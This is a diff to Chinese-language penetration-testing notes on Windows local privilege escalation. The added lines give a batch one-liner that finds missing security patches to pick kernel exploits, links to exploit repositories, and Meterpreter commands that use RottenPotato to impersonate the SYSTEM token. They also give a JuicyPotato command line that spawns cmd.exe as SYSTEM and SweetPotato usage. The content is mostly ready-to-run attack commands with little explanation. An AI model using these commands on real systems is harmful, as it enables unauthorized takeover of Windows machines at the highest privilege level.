@@ -10,13 +10,33 @@ privilege-escalation-awesome-scripts：winPEAS.bat
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat
 
 # 提权工具脚本
-RottenPotato：
-将服务帐户本地提权至SYSTEM
-load incognito
-list_tokens –u
-upload /root/rottenpotato.exe .
-execute -Hc -f rottenpotato.exe
-impersonate_token “NT AUTHORITY\SYSTEM”
-将SYSTEM token添加到impersonate user tokens下
 
 https://blog.csdn.net/weixin_43873557/article/details/113760973
+
+
+快速查找exp
+
+systeminfo>micropoor.txt&(for %i in (   KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a  micropoor.txt
+
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/WindowsExploits/Exploits
+
+
+## RottenPotato
+https://github.com/foxglovesec/RottenPotato
+```bash
+msfmeter> use incognito
+msfmeter> list_tokens -u
+msfmeter> execute -cH -f C:/Users/test/Desktop/rottenpotato.exe
+msfmeter> list_tokens -u
+msfmeter> impersonate_token "NT AUTHORITY\SYSTEM"
+```
+## juicypotato
+https://blog.csdn.net/negnegil/article/details/120243657
+https://github.com/uknowsec/JuicyPotato
+JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {4991d34b-80a1-4291-83b6-3328366b9097}
+
+https://github.com/breenmachine/RottenPotatoNG
+https://github.com/antonioCoco/RoguePotato2
+https://github.com/CCob/SweetPotato
+SweetPotato -a whoami
